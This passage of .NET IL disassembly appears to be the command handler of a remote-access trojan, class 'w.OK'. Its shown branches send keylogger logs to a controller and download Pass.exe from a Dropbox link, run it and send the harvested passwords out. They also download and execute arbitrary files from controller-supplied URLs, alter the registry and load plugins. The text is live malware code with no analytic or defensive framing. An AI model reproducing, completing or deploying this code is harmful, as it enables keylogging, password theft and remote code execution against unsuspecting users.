        IL_08c3:  ldloc.s    VB$CG$t_bool$S1
        IL_08c5:  brtrue.s   IL_0851

        IL_08c7:  leave.s    IL_08d9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_08c9:  dup
        IL_08ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08cf:  stloc.s    ex
        IL_08d1:  nop
        IL_08d2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_08d7:  leave.s    IL_08d9

      }  // end handler
      IL_08d9:  nop
      IL_08da:  nop
      IL_08db:  nop
      IL_08dc:  br         IL_0bd7

      IL_08e1:  nop
      IL_08e2:  ldloc.s    VB$t_string$L0
      IL_08e4:  ldstr      "udpstp"
      IL_08e9:  ldc.i4.0
      IL_08ea:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08ef:  ldc.i4.0
      IL_08f0:  ceq
      IL_08f2:  stloc.s    VB$CG$t_bool$S1
      IL_08f4:  ldloc.s    VB$CG$t_bool$S1
      IL_08f6:  brfalse.s  IL_0904

      IL_08f8:  nop
      IL_08f9:  ldc.i4.0
      IL_08fa:  stsfld     bool w.OK::udp
      IL_08ff:  br         IL_0bd7

      IL_0904:  nop
      IL_0905:  ldloc.s    VB$t_string$L0
      IL_0907:  ldstr      "pingstop"
      IL_090c:  ldc.i4.0
      IL_090d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0912:  ldc.i4.0
      IL_0913:  ceq
      IL_0915:  stloc.s    VB$CG$t_bool$S1
      IL_0917:  ldloc.s    VB$CG$t_bool$S1
      IL_0919:  brfalse.s  IL_092f

      IL_091b:  nop
      IL_091c:  ldstr      "taskkill /F /IM PING.EXE"
      IL_0921:  ldc.i4.0
      IL_0922:  ldc.i4.0
      IL_0923:  ldc.i4.m1
      IL_0924:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0929:  pop
      IL_092a:  br         IL_0bd7

      IL_092f:  nop
      IL_0930:  ldloc.s    VB$t_string$L0
      IL_0932:  ldstr      "ll"
      IL_0937:  ldc.i4.0
      IL_0938:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_093d:  ldc.i4.0
      IL_093e:  ceq
      IL_0940:  stloc.s    VB$CG$t_bool$S1
      IL_0942:  ldloc.s    VB$CG$t_bool$S1
      IL_0944:  brfalse.s  IL_0958

      IL_0946:  nop
      IL_0947:  ldc.i4.0
      IL_0948:  stsfld     bool w.OK::Cn
      IL_094d:  nop
      IL_094e:  leave      IL_192e

      IL_0953:  br         IL_0bd7

      IL_0958:  nop
      IL_0959:  ldloc.s    VB$t_string$L0
      IL_095b:  ldstr      "kl"
      IL_0960:  ldc.i4.0
      IL_0961:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0966:  ldc.i4.0
      IL_0967:  ceq
      IL_0969:  stloc.s    VB$CG$t_bool$S1
      IL_096b:  ldloc.s    VB$CG$t_bool$S1
      IL_096d:  brfalse.s  IL_099f

      IL_096f:  nop
      IL_0970:  ldstr      "kl"
      IL_0975:  ldsfld     string w.OK::Y
      IL_097a:  ldsfld     class w.kl w.OK::kq
      IL_097f:  ldflda     string w.kl::Logs
      IL_0984:  call       string w.OK::ENB(string&)
      IL_0989:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_098e:  call       bool w.OK::Send(string)
      IL_0993:  pop
      IL_0994:  nop
      IL_0995:  leave      IL_192e

      IL_099a:  br         IL_0bd7

      IL_099f:  nop
      IL_09a0:  ldloc.s    VB$t_string$L0
      IL_09a2:  ldstr      "pas"
      IL_09a7:  ldc.i4.0
      IL_09a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09ad:  ldc.i4.0
      IL_09ae:  ceq
      IL_09b0:  stloc.s    VB$CG$t_bool$S1
      IL_09b2:  ldloc.s    VB$CG$t_bool$S1
      IL_09b4:  brfalse    IL_0a83

      IL_09b9:  nop
      IL_09ba:  nop
      .try
      {
        IL_09bb:  ldstr      "temp"
        IL_09c0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_09c5:  ldstr      "/pass.exe"
        IL_09ca:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_09cf:  stloc.s    patfh
        IL_09d1:  ldloc.s    patfh
        IL_09d3:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_09d8:  stloc.s    VB$CG$t_bool$S1
        IL_09da:  ldloc.s    VB$CG$t_bool$S1
        IL_09dc:  brfalse.s  IL_09e1

        IL_09de:  nop
        IL_09df:  leave.s    IL_0a28

        IL_09e1:  nop
        IL_09e2:  nop
        .try
        {
          IL_09e3:  newobj     instance void [System]System.Net.WebClient::.ctor()
          IL_09e8:  stloc.s    aaaa
          IL_09ea:  ldloc.s    aaaa
          IL_09ec:  ldstr      "https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe\?"
          + "dl=0"
          IL_09f1:  ldloc.s    patfh
          IL_09f3:  callvirt   instance void [System]System.Net.WebClient::DownloadFile(string,
                                                                                        string)
          IL_09f8:  nop
          IL_09f9:  ldloc.s    patfh
          IL_09fb:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
          IL_0a00:  pop
          IL_0a01:  leave.s    IL_0a13

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0a03:  dup
          IL_0a04:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0a09:  stloc.s    V_18
          IL_0a0b:  nop
          IL_0a0c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0a11:  leave.s    IL_0a13

        }  // end handler
        IL_0a13:  nop
        IL_0a14:  leave.s    IL_0a26

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a16:  dup
        IL_0a17:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a1c:  stloc.s    V_19
        IL_0a1e:  nop
        IL_0a1f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a24:  leave.s    IL_0a26

      }  // end handler
      IL_0a26:  nop
      IL_0a27:  nop
      IL_0a28:  nop
      IL_0a29:  nop
      .try
      {
        IL_0a2a:  ldstr      "temp"
        IL_0a2f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_0a34:  ldstr      "/temp.txt"
        IL_0a39:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0a3e:  stloc.s    patfh2
        IL_0a40:  ldloc.s    patfh2
        IL_0a42:  call       string [mscorlib]System.IO.File::ReadAllText(string)
        IL_0a47:  stloc.s    aa
        IL_0a49:  ldstr      "pas"
        IL_0a4e:  ldsfld     string w.OK::Y
        IL_0a53:  ldloca.s   aa
        IL_0a55:  call       string w.OK::ENB(string&)
        IL_0a5a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0a5f:  call       bool w.OK::Send(string)
        IL_0a64:  pop
        IL_0a65:  leave.s    IL_0a77

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a67:  dup
        IL_0a68:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a6d:  stloc.s    V_22
        IL_0a6f:  nop
        IL_0a70:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a75:  leave.s    IL_0a77

      }  // end handler
      IL_0a77:  nop
      IL_0a78:  nop
      IL_0a79:  leave      IL_192e

      IL_0a7e:  br         IL_0bd7

      IL_0a83:  nop
      IL_0a84:  ldloc.s    VB$t_string$L0
      IL_0a86:  ldstr      "ll"
      IL_0a8b:  ldc.i4.0
      IL_0a8c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a91:  ldc.i4.0
      IL_0a92:  ceq
      IL_0a94:  stloc.s    VB$CG$t_bool$S1
      IL_0a96:  ldloc.s    VB$CG$t_bool$S1
      IL_0a98:  brfalse.s  IL_0aac

      IL_0a9a:  nop
      IL_0a9b:  ldc.i4.0
      IL_0a9c:  stsfld     bool w.OK::Cn
      IL_0aa1:  nop
      IL_0aa2:  leave      IL_192e

      IL_0aa7:  br         IL_0bd7

      IL_0aac:  nop
      IL_0aad:  ldloc.s    VB$t_string$L0
      IL_0aaf:  ldstr      "kl"
      IL_0ab4:  ldc.i4.0
      IL_0ab5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0aba:  ldc.i4.0
      IL_0abb:  ceq
      IL_0abd:  stloc.s    VB$CG$t_bool$S1
      IL_0abf:  ldloc.s    VB$CG$t_bool$S1
      IL_0ac1:  brfalse.s  IL_0af3

      IL_0ac3:  nop
      IL_0ac4:  ldstr      "kl"
      IL_0ac9:  ldsfld     string w.OK::Y
      IL_0ace:  ldsfld     class w.kl w.OK::kq
      IL_0ad3:  ldflda     string w.kl::Logs
      IL_0ad8:  call       string w.OK::ENB(string&)
      IL_0add:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0ae2:  call       bool w.OK::Send(string)
      IL_0ae7:  pop
      IL_0ae8:  nop
      IL_0ae9:  leave      IL_192e

      IL_0aee:  br         IL_0bd7

      IL_0af3:  nop
      IL_0af4:  ldloc.s    VB$t_string$L0
      IL_0af6:  ldstr      "prof"
      IL_0afb:  ldc.i4.0
      IL_0afc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b01:  ldc.i4.0
      IL_0b02:  ceq
      IL_0b04:  stloc.s    VB$CG$t_bool$S1
      IL_0b06:  ldloc.s    VB$CG$t_bool$S1
      IL_0b08:  brfalse    IL_0bd7

      IL_0b0d:  nop
      IL_0b0e:  nop
      IL_0b0f:  ldloc.0
      IL_0b10:  ldc.i4.1
      IL_0b11:  ldelem.ref
      IL_0b12:  stloc.s    VB$t_string$L5
      IL_0b14:  nop
      IL_0b15:  ldloc.s    VB$t_string$L5
      IL_0b17:  ldstr      "~"
      IL_0b1c:  ldc.i4.0
      IL_0b1d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b22:  ldc.i4.0
      IL_0b23:  ceq
      IL_0b25:  stloc.s    VB$CG$t_bool$S0
      IL_0b27:  ldloc.s    VB$CG$t_bool$S0
      IL_0b29:  brfalse.s  IL_0b44

      IL_0b2b:  nop
      IL_0b2c:  ldloc.0
      IL_0b2d:  ldc.i4.2
      IL_0b2e:  ldelem.ref
      IL_0b2f:  ldloc.0
      IL_0b30:  ldc.i4.3
      IL_0b31:  ldelem.ref
      IL_0b32:  ldc.i4.1
      IL_0b33:  call       bool w.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0b38:  pop
      IL_0b39:  nop
      IL_0b3a:  br         IL_0bd0

      IL_0b3f:  br         IL_0bd0

      IL_0b44:  nop
      IL_0b45:  ldloc.s    VB$t_string$L5
      IL_0b47:  ldstr      "!"
      IL_0b4c:  ldc.i4.0
      IL_0b4d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b52:  ldc.i4.0
      IL_0b53:  ceq
      IL_0b55:  stloc.s    VB$CG$t_bool$S1
      IL_0b57:  ldloc.s    VB$CG$t_bool$S1
      IL_0b59:  brfalse.s  IL_0bac

      IL_0b5b:  nop
      IL_0b5c:  ldloc.0
      IL_0b5d:  ldc.i4.2
      IL_0b5e:  ldelem.ref
      IL_0b5f:  ldloc.0
      IL_0b60:  ldc.i4.3
      IL_0b61:  ldelem.ref
      IL_0b62:  ldc.i4.1
      IL_0b63:  call       bool w.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0b68:  pop
      IL_0b69:  ldstr      "getvalue"
      IL_0b6e:  ldsfld     string w.OK::Y
      IL_0b73:  ldloc.0
      IL_0b74:  ldc.i4.1
      IL_0b75:  ldelem.ref
      IL_0b76:  ldsfld     string w.OK::Y
      IL_0b7b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0b80:  ldloc.0
      IL_0b81:  ldc.i4.1
      IL_0b82:  ldelem.ref
      IL_0b83:  ldstr      ""
      IL_0b88:  call       object w.OK::GTV(string,
                                            object)
      IL_0b8d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0b92:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0b97:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0b9c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0ba1:  call       bool w.OK::Send(string)
      IL_0ba6:  pop
      IL_0ba7:  nop
      IL_0ba8:  br.s       IL_0bd0

      IL_0baa:  br.s       IL_0bd0

      IL_0bac:  nop
      IL_0bad:  ldloc.s    VB$t_string$L5
      IL_0baf:  ldstr      "@"
      IL_0bb4:  ldc.i4.0
      IL_0bb5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bba:  ldc.i4.0
      IL_0bbb:  ceq
      IL_0bbd:  stloc.s    VB$CG$t_bool$S1
      IL_0bbf:  ldloc.s    VB$CG$t_bool$S1
      IL_0bc1:  brfalse.s  IL_0bd0

      IL_0bc3:  nop
      IL_0bc4:  ldloc.0
      IL_0bc5:  ldc.i4.2
      IL_0bc6:  ldelem.ref
      IL_0bc7:  call       void w.OK::DLV(string)
      IL_0bcc:  nop
      IL_0bcd:  nop
      IL_0bce:  br.s       IL_0bd0

      IL_0bd0:  nop
      IL_0bd1:  nop
      IL_0bd2:  leave      IL_192e

      IL_0bd7:  nop
      IL_0bd8:  ldloc.s    str4
      IL_0bda:  ldstr      "rn"
      IL_0bdf:  ldc.i4.0
      IL_0be0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0be5:  ldc.i4.0
      IL_0be6:  ceq
      IL_0be8:  ldc.i4.0
      IL_0be9:  ceq
      IL_0beb:  stloc.s    VB$CG$t_bool$S1
      IL_0bed:  ldloc.s    VB$CG$t_bool$S1
      IL_0bef:  brfalse.s  IL_0bf6

      IL_0bf1:  br         IL_0d98

      IL_0bf6:  nop
      IL_0bf7:  ldloc.0
      IL_0bf8:  ldc.i4.2
      IL_0bf9:  ldelem.ref
      IL_0bfa:  ldc.i4.0
      IL_0bfb:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0c00:  ldc.i4.s   31
      IL_0c02:  ceq
      IL_0c04:  stloc.s    VB$CG$t_bool$S1
      IL_0c06:  ldloc.s    VB$CG$t_bool$S1
      IL_0c08:  brfalse    IL_0c9c

      IL_0c0d:  nop
      .try
      {
        IL_0c0e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0c13:  stloc.s    'stream'
        IL_0c15:  ldloc.0
        IL_0c16:  ldc.i4.0
        IL_0c17:  ldelem.ref
        IL_0c18:  ldsfld     string w.OK::Y
        IL_0c1d:  ldloc.0
        IL_0c1e:  ldc.i4.1
        IL_0c1f:  ldelem.ref
        IL_0c20:  ldsfld     string w.OK::Y
        IL_0c25:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0c2a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0c2f:  stloc.s    length
        IL_0c31:  ldloc.s    'stream'
        IL_0c33:  ldarg.0
        IL_0c34:  ldloc.s    length
        IL_0c36:  ldarg.0
        IL_0c37:  ldlen
        IL_0c38:  conv.ovf.i4
        IL_0c39:  ldloc.s    length
        IL_0c3b:  sub.ovf
        IL_0c3c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0c41:  nop
        IL_0c42:  ldloc.s    'stream'
        IL_0c44:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0c49:  call       uint8[] w.OK::ZIP(uint8[])
        IL_0c4e:  stloc.1
        IL_0c4f:  nop
        IL_0c50:  leave      IL_0cf6

        IL_0c55:  leave.s    IL_0c9b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0c57:  dup
        IL_0c58:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0c5d:  stloc.s    exception1
        IL_0c5f:  nop
        IL_0c60:  ldloc.s    exception1
        IL_0c62:  stloc.s    exception
        IL_0c64:  ldstr      "MSG"
        IL_0c69:  ldsfld     string w.OK::Y
        IL_0c6e:  ldstr      "Execute ERROR"
        IL_0c73:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0c78:  call       bool w.OK::Send(string)
        IL_0c7d:  pop
        IL_0c7e:  ldstr      "bla"
        IL_0c83:  call       bool w.OK::Send(string)
        IL_0c88:  pop
        IL_0c89:  nop
        IL_0c8a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0c8f:  leave      IL_192e

        IL_0c94:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0c99:  leave.s    IL_0c9b

      }  // end handler
      IL_0c9b:  nop
      IL_0c9c:  nop
      IL_0c9d:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0ca2:  stloc.3
      IL_0ca3:  nop
      .try
      {
        IL_0ca4:  ldloc.3
        IL_0ca5:  ldloc.0
        IL_0ca6:  ldc.i4.2
        IL_0ca7:  ldelem.ref
        IL_0ca8:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0cad:  stloc.1
        IL_0cae:  leave.s    IL_0cf4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0cb0:  dup
        IL_0cb1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0cb6:  stloc.s    exception10
        IL_0cb8:  nop
        IL_0cb9:  ldloc.s    exception10
        IL_0cbb:  stloc.s    exception2
        IL_0cbd:  ldstr      "MSG"
        IL_0cc2:  ldsfld     string w.OK::Y
        IL_0cc7:  ldstr      "Download ERROR"
        IL_0ccc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0cd1:  call       bool w.OK::Send(string)
        IL_0cd6:  pop
        IL_0cd7:  ldstr      "bla"
        IL_0cdc:  call       bool w.OK::Send(string)
        IL_0ce1:  pop
        IL_0ce2:  nop
        IL_0ce3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0ce8:  leave      IL_192e

        IL_0ced:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0cf2:  leave.s    IL_0cf4

      }  // end handler
      IL_0cf4:  nop
      IL_0cf5:  nop
      IL_0cf6:  nop
      IL_0cf7:  ldstr      "bla"
      IL_0cfc:  call       bool w.OK::Send(string)
      IL_0d01:  pop
      IL_0d02:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0d07:  ldstr      "."
      IL_0d0c:  ldloc.0
      IL_0d0d:  ldc.i4.1
      IL_0d0e:  ldelem.ref
      IL_0d0f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0d14:  stloc.s    path
      IL_0d16:  nop
      .try
      {
        IL_0d17:  ldloc.s    path
        IL_0d19:  ldloc.1
        IL_0d1a:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0d1f:  nop
        IL_0d20:  ldloc.s    path
        IL_0d22:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0d27:  pop
        IL_0d28:  ldstr      "MSG"
        IL_0d2d:  ldsfld     string w.OK::Y
        IL_0d32:  ldstr      "Executed As "
        IL_0d37:  ldloc.s    path
        IL_0d39:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0d3e:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0d43:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0d48:  call       bool w.OK::Send(string)
        IL_0d4d:  pop
        IL_0d4e:  nop
        IL_0d4f:  leave      IL_192e

        IL_0d54:  leave.s    IL_0d96

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0d56:  dup
        IL_0d57:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d5c:  stloc.s    exception11
        IL_0d5e:  nop
        IL_0d5f:  ldloc.s    exception11
        IL_0d61:  stloc.s    exception3
        IL_0d63:  ldstr      "MSG"
        IL_0d68:  ldsfld     string w.OK::Y
        IL_0d6d:  ldstr      "Execute ERROR "
        IL_0d72:  ldloc.s    exception3
        IL_0d74:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0d79:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0d7e:  call       bool w.OK::Send(string)
        IL_0d83:  pop
        IL_0d84:  nop
        IL_0d85:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d8a:  leave      IL_192e

        IL_0d8f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d94:  leave.s    IL_0d96

      }  // end handler
      IL_0d96:  nop
      IL_0d97:  nop
      IL_0d98:  nop
      IL_0d99:  nop
      IL_0d9a:  ldloc.s    str4
      IL_0d9c:  stloc.s    VB$t_string$L6
      IL_0d9e:  nop
      IL_0d9f:  ldloc.s    VB$t_string$L6
      IL_0da1:  ldstr      "inv"
      IL_0da6:  ldc.i4.0
      IL_0da7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0dac:  ldc.i4.0
      IL_0dad:  ceq
      IL_0daf:  stloc.s    VB$CG$t_bool$S1
      IL_0db1:  ldloc.s    VB$CG$t_bool$S1
      IL_0db3:  brfalse    IL_1054

      IL_0db8:  nop
      IL_0db9:  ldloc.0
      IL_0dba:  ldc.i4.1
      IL_0dbb:  ldelem.ref
      IL_0dbc:  ldc.i4.0
      IL_0dbd:  newarr     [mscorlib]System.Byte
      IL_0dc2:  call       object w.OK::GTV(string,
                                            object)
      IL_0dc7:  castclass  uint8[]
      IL_0dcc:  stloc.s    t
      IL_0dce:  ldloc.0
      IL_0dcf:  ldc.i4.3
      IL_0dd0:  ldelem.ref
      IL_0dd1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0dd6:  ldc.i4.s   10
      IL_0dd8:  clt
      IL_0dda:  ldloc.s    t
      IL_0ddc:  ldlen
      IL_0ddd:  conv.ovf.i4
      IL_0dde:  ldc.i4.0
      IL_0ddf:  ceq
      IL_0de1:  and
      IL_0de2:  stloc.s    VB$CG$t_bool$S1
      IL_0de4:  ldloc.s    VB$CG$t_bool$S1
      IL_0de6:  brfalse.s  IL_0e33

      IL_0de8:  ldc.i4.5
      IL_0de9:  newarr     [mscorlib]System.String
      IL_0dee:  stloc.s    VB$t_array$S0
      IL_0df0:  ldloc.s    VB$t_array$S0
      IL_0df2:  ldc.i4.0
      IL_0df3:  ldstr      "pl"
      IL_0df8:  stelem.ref
      IL_0df9:  nop
      IL_0dfa:  ldloc.s    VB$t_array$S0
      IL_0dfc:  ldc.i4.1
      IL_0dfd:  ldsfld     string w.OK::Y
      IL_0e02:  stelem.ref
      IL_0e03:  nop
      IL_0e04:  ldloc.s    VB$t_array$S0
      IL_0e06:  ldc.i4.2
      IL_0e07:  ldloc.0
      IL_0e08:  ldc.i4.1
      IL_0e09:  ldelem.ref
      IL_0e0a:  stelem.ref
      IL_0e0b:  nop
      IL_0e0c:  ldloc.s    VB$t_array$S0
      IL_0e0e:  ldc.i4.3
      IL_0e0f:  ldsfld     string w.OK::Y
      IL_0e14:  stelem.ref
      IL_0e15:  nop
      IL_0e16:  ldloc.s    VB$t_array$S0
      IL_0e18:  ldc.i4.4
      IL_0e19:  ldc.i4.1
      IL_0e1a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0e1f:  stelem.ref
      IL_0e20:  nop
      IL_0e21:  ldloc.s    VB$t_array$S0
      IL_0e23:  call       string [mscorlib]System.String::Concat(string[])
      IL_0e28:  call       bool w.OK::Send(string)
      IL_0e2d:  pop
      IL_0e2e:  br         IL_1048

      IL_0e33:  nop
      IL_0e34:  ldloc.0
      IL_0e35:  ldc.i4.3
      IL_0e36:  ldelem.ref
      IL_0e37:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0e3c:  ldc.i4.s   10
      IL_0e3e:  cgt
      IL_0e40:  stloc.s    VB$CG$t_bool$S1
      IL_0e42:  ldloc.s    VB$CG$t_bool$S1
      IL_0e44:  brfalse.s  IL_0ec4

      IL_0e46:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0e4b:  stloc.s    stream2
      IL_0e4d:  ldc.i4.6
      IL_0e4e:  newarr     [mscorlib]System.String
      IL_0e53:  stloc.s    VB$t_array$S0
      IL_0e55:  ldloc.s    VB$t_array$S0
      IL_0e57:  ldc.i4.0
      IL_0e58:  ldloc.0
      IL_0e59:  ldc.i4.0
      IL_0e5a:  ldelem.ref
      IL_0e5b:  stelem.ref
      IL_0e5c:  nop
      IL_0e5d:  ldloc.s    VB$t_array$S0
      IL_0e5f:  ldc.i4.1
      IL_0e60:  ldsfld     string w.OK::Y
      IL_0e65:  stelem.ref
      IL_0e66:  nop
      IL_0e67:  ldloc.s    VB$t_array$S0
      IL_0e69:  ldc.i4.2
      IL_0e6a:  ldloc.0
      IL_0e6b:  ldc.i4.1
      IL_0e6c:  ldelem.ref
      IL_0e6d:  stelem.ref
      IL_0e6e:  nop
      IL_0e6f:  ldloc.s    VB$t_array$S0
      IL_0e71:  ldc.i4.3
      IL_0e72:  ldsfld     string w.OK::Y
      IL_0e77:  stelem.ref
      IL_0e78:  nop
      IL_0e79:  ldloc.s    VB$t_array$S0
      IL_0e7b:  ldc.i4.4
      IL_0e7c:  ldloc.0
      IL_0e7d:  ldc.i4.2
      IL_0e7e:  ldelem.ref
      IL_0e7f:  stelem.ref
      IL_0e80:  nop
      IL_0e81:  ldloc.s    VB$t_array$S0
      IL_0e83:  ldc.i4.5
      IL_0e84:  ldsfld     string w.OK::Y
      IL_0e89:  stelem.ref
      IL_0e8a:  nop
      IL_0e8b:  ldloc.s    VB$t_array$S0
      IL_0e8d:  call       string [mscorlib]System.String::Concat(string[])
      IL_0e92:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0e97:  stloc.s    offset
      IL_0e99:  ldloc.s    stream2
      IL_0e9b:  ldarg.0
      IL_0e9c:  ldloc.s    offset
      IL_0e9e:  ldarg.0
      IL_0e9f:  ldlen
      IL_0ea0:  conv.ovf.i4
      IL_0ea1:  ldloc.s    offset
      IL_0ea3:  sub.ovf
      IL_0ea4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0ea9:  nop
      IL_0eaa:  ldloc.s    stream2
      IL_0eac:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0eb1:  call       uint8[] w.OK::ZIP(uint8[])
      IL_0eb6:  stloc.s    t
      IL_0eb8:  ldloc.0
      IL_0eb9:  ldc.i4.1
      IL_0eba:  ldelem.ref
      IL_0ebb:  ldloc.s    t
      IL_0ebd:  ldc.i4.3
      IL_0ebe:  call       bool w.OK::STV(string,
                                          object,
